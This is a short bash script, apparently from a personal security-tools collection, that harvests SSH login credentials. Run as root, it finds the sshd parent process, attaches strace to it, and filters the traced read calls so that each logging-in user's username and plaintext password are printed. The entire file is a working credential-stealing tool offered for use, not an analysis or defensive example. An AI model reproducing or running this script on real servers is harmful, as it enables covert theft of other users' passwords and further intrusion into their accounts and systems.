#!/usr/bin/env bash
#
# Author:       Riccardo Mollo (riccardomollo84@gmail.com)
#
# Name:	        sniff_ssh_credentials.sh
#
# Description:  A script that sniffs usernames and passwords in plaintext.
#               You must be root on the server where SSH daemon is running.
#               The output will be something like:
#
#               user1
#               password1
#               user2
#               password2
#               ...
#
# Usage:        ./sniff_ssh_credentials.sh
#
#
# --TODO--
# - improve sed regexp
# - ???
#
#
################################################################################


# FUNCTIONS --------------------------------------------------------------------

command_exists() {
    command -v "$1" >/dev/null 2>&1 || { echo "Command not found: $1" 1>&2 ; exit 1 ; }
}


# CHECKS -----------------------------------------------------------------------

if [[ $EUID -ne 0 ]] ; then
    echo "This script must be run as root!" 1>&2

    exit 1
fi

declare -a CMDS=(
"strace"
);

for CMD in ${CMDS[@]} ; do
    command_exists $CMD
done


# MAIN -------------------------------------------------------------------------


SSHD_PPID=$(ps axf | grep sshd | grep -v grep | grep -v 'sshd:' | awk '{ print $1 }')

strace -f -p $SSHD_PPID 2>&1 | grep --line-buffered -F 'read(6' | grep --line-buffered -E '\\10\\0\\0\\0|\\f\\0\\0\\0' | grep --line-buffered -oP '(?<=, ").*(?=",)' | sed -e 's/\\[[:alnum:]]//g'

